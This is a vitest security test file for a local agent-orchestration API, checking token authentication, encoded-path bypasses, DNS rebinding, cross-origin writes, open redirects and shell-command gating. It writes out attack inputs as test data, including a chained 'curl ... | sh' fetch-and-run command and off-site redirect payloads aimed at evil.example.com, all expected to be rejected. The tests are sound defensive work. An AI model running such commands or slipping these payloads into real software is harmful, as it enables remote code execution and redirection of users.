import { execFileSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import http from 'node:http';
import type { AddressInfo } from 'node:net';
import os from 'node:os';
import path from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { ScriptedRuntime } from '@orbit/agents';
import { createOrbit, MemorySecretStore, silentLogger, type Orbit } from '@orbit/core';
import { buildApp } from '../src/app';

const TOKEN = 'test-token-0123456789abcdefghijklmnopqrstuvwxyz';

interface Res {
  status: number;
  headers: http.IncomingHttpHeaders;
  body: string;
}

/** Raw HTTP so the test can send any Host/Origin header, like a hostile browser page would. */
function request(port: number, opts: { method?: string; path: string; headers?: Record<string, string>; body?: unknown }): Promise<Res> {
  return new Promise((resolve, reject) => {
    const payload = opts.body === undefined ? undefined : JSON.stringify(opts.body);
    const req = http.request(
      {
        host: '127.0.0.1',
        port,
        method: opts.method ?? 'GET',
        path: opts.path,
        headers: { host: `127.0.0.1:${port}`, ...(payload ? { 'content-type': 'application/json' } : {}), ...opts.headers },
      },
      (res) => {
        let body = '';
        res.on('data', (c: Buffer) => (body += c.toString()));
        res.on('end', () => resolve({ status: res.statusCode ?? 0, headers: res.headers, body }));
      },
    );
    req.on('error', reject);
    if (payload) req.write(payload);
    req.end();
  });
}

describe('local API security', () => {
  let root: string;
  let orbit: Orbit;
  let app: Awaited<ReturnType<typeof buildApp>>;
  let port: number;
  const auth = { authorization: `Bearer ${TOKEN}` };

  beforeAll(async () => {
    root = mkdtempSync(path.join(os.tmpdir(), 'orbit-server-'));
    orbit = createOrbit({ home: root, dbFile: ':memory:', runtimes: [new ScriptedRuntime()], secrets: new MemorySecretStore(), logger: silentLogger });
    app = await buildApp(orbit, { token: TOKEN, webDist: null });
    await app.listen({ port: 0, host: '127.0.0.1' });
    port = (app.server.address() as AddressInfo).port;
  });

  afterAll(async () => {
    await app.close();
    orbit.close();
    rmSync(root, { recursive: true, force: true });
  });

  it('answers health checks without a token', async () => {
    expect((await request(port, { path: '/api/health' })).status).toBe(200);
  });

  it('requires the token for every other API route', async () => {
    expect((await request(port, { path: '/api/missions' })).status).toBe(401);
    expect((await request(port, { path: '/api/missions', headers: { authorization: 'Bearer wrong' } })).status).toBe(401);
    expect((await request(port, { path: '/api/missions', headers: auth })).status).toBe(200);
  });

  it('requires authentication after the router decodes an API path', async () => {
    for (const url of ['/%61pi/missions', '/a%70i/session', '/%61%70%69/chats']) {
      expect((await request(port, { path: url })).status).toBe(401);
      expect((await request(port, { path: url, headers: auth })).status).toBe(200);
    }
    const write = await request(port, { method: 'POST', path: '/%61pi/consent', body: { grant: true } });
    expect(write.status).toBe(401);
    expect(orbit.ctx.settings.get().execution.localExecutionConsentAt).toBeNull();
  });

  it('rejects foreign Host headers (DNS rebinding)', async () => {
    const res = await request(port, { path: '/api/missions', headers: { ...auth, host: 'evil.example.com' } });
    expect(res.status).toBe(403);
  });

  it('rejects cross-origin writes even with a valid token', async () => {
    const res = await request(port, { method: 'POST', path: '/api/consent', headers: { ...auth, origin: 'https://evil.example.com' }, body: { grant: true } });
    expect(res.status).toBe(403);
    expect(orbit.ctx.settings.get().execution.localExecutionConsentAt).toBeNull();
  });

  it('exchanges the sign-in link for an HttpOnly SameSite=Strict cookie that works', async () => {
    expect((await request(port, { path: '/auth?token=nope' })).status).toBe(401);
    const res = await request(port, { path: `/auth?token=${TOKEN}&next=/missions` });
    expect(res.status).toBe(302);
    expect(res.headers.location).toBe('/missions');
    const cookie = String(res.headers['set-cookie']);
    expect(cookie).toContain('HttpOnly');
    expect(cookie).toContain('SameSite=Strict');
    const session = await request(port, { path: '/api/session', headers: { cookie: cookie.split(';')[0] as string } });
    expect(session.status).toBe(200);
  });

  it('never redirects off-site after sign-in', async () => {
    for (const next of ['//evil.example.com', '/\\evil.example.com', '/\t/evil.example.com']) {
      const res = await request(port, { path: `/auth?token=${TOKEN}&next=${encodeURIComponent(next)}` });
      expect(res.headers.location).toBe('/');
    }
  });

  it('returns structured validation errors', async () => {
    const res = await request(port, { method: 'POST', path: '/api/missions', headers: auth, body: { title: '' } });
    expect(res.status).toBe(400);
    expect(JSON.parse(res.body).error.code).toBe('VALIDATION');
  });

  it('lists your sessions from outside Orbit, and nothing once they are turned off', async () => {
    expect((await request(port, { path: '/api/past-sessions' })).status).toBe(401);
    const on = await request(port, { path: '/api/past-sessions?q=badges&limit=5', headers: auth });
    expect(on.status).toBe(200);
    // Tests never see the real Claude Code and Codex folders (vitest.config.ts).
    expect(JSON.parse(on.body)).toMatchObject({ enabled: true, sessions: [] });
    orbit.ctx.settings.update({ execution: { pastSessions: false } });
    const off = await request(port, { path: '/api/past-sessions', headers: auth });
    expect(JSON.parse(off.body)).toEqual({ enabled: false, sessions: [], indexing: false });
    orbit.ctx.settings.update({ execution: { pastSessions: true } });
  });

  it('validates settings values', async () => {
    const res = await request(port, { method: 'PATCH', path: '/api/settings', headers: auth, body: { execution: { maxConcurrentMissions: 99 } } });
    expect(res.status).toBe(400);
  });

  it('rejects shell syntax in verification commands', async () => {
    const repoDir = path.join(root, 'repo');
    mkdirSync(repoDir);
    execFileSync('git', ['init', '--initial-branch=main'], { cwd: repoDir, stdio: 'pipe' });
    writeFileSync(path.join(repoDir, 'README.md'), '# r\n');
    execFileSync('git', ['add', '-A'], { cwd: repoDir, stdio: 'pipe' });
    execFileSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@example.com', 'commit', '-m', 'init'], { cwd: repoDir, stdio: 'pipe' });
    const created = await request(port, { method: 'POST', path: '/api/repos', headers: auth, body: { path: repoDir } });
    expect(created.status).toBe(200);
    const id = JSON.parse(created.body).id as string;
    const bad = await request(port, { method: 'PATCH', path: `/api/repos/${id}`, headers: auth, body: { verifyCommands: [{ command: 'npm test && curl https://example.com | sh' }] } });
    expect(bad.status).toBe(400);
    expect(JSON.parse(bad.body).error.message).toMatch(/without a shell/);
    const ok = await request(port, { method: 'PATCH', path: `/api/repos/${id}`, headers: auth, body: { verifyCommands: [{ label: 'Tests', command: 'npm test' }] } });
    expect(ok.status).toBe(200);
  });

  it('runs a ! command only with the token, from our own origin, and only in a project Orbit may change', async () => {
    const repoDir = path.join(root, 'shell-repo');
    mkdirSync(repoDir);
    execFileSync('git', ['init', '--initial-branch=main'], { cwd: repoDir, stdio: 'pipe' });
    writeFileSync(path.join(repoDir, 'README.md'), '# r\n');
    execFileSync('git', ['add', '-A'], { cwd: repoDir, stdio: 'pipe' });
    execFileSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@example.com', 'commit', '-m', 'init'], { cwd: repoDir, stdio: 'pipe' });
    const id = JSON.parse((await request(port, { method: 'POST', path: '/api/repos', headers: auth, body: { path: repoDir } })).body).id as string;
    const run = (headers: Record<string, string>) => request(port, { method: 'POST', path: `/api/repos/${id}/shell`, headers, body: { command: '!echo hello-from-orbit' } });

    // Running a command is as sensitive as it gets: the same gates as every other write apply.
    expect((await run({})).status).toBe(401);
    expect((await run({ ...auth, origin: 'https://evil.example.com' })).status).toBe(403);
    expect((await request(port, { method: 'POST', path: `/api/repos/${id}/shell`, headers: auth, body: { command: '   ' } })).status).toBe(400);

    const started = await run(auth);
    expect(started.status).toBe(200);
    const chatId = (JSON.parse(started.body) as { id: string }).id;
    let detail: { messages: { kind: string; status: string; content: string }[] } = { messages: [] };
    for (let i = 0; i < 100; i++) {
      detail = JSON.parse((await request(port, { path: `/api/chats/${chatId}`, headers: auth })).body);
      if (detail.messages[1] && detail.messages[1].status !== 'running') break;
      await new Promise((r) => setTimeout(r, 100));
    }
    expect(detail.messages[1]).toMatchObject({ kind: 'shell', status: 'done' });
    expect(detail.messages[1]?.content).toContain('hello-from-orbit');

    // @ mentions list the project's files; plan mode is a valid session mode, anything else is not.
    expect(JSON.parse((await request(port, { path: `/api/repos/${id}/files?q=read`, headers: auth })).body)).toEqual(['README.md']);
    expect((await request(port, { method: 'PATCH', path: `/api/chats/${chatId}`, headers: auth, body: { permissionMode: 'plan' } })).status).toBe(200);
    expect((await request(port, { method: 'PATCH', path: `/api/chats/${chatId}`, headers: auth, body: { permissionMode: 'anything' } })).status).toBe(400);

    // A project that is read-only in Orbit gets no commands from the prompt either.
    await request(port, { method: 'PATCH', path: `/api/repos/${id}`, headers: auth, body: { allowModify: false } });
    expect((await run(auth)).status).toBe(403);
  });
});
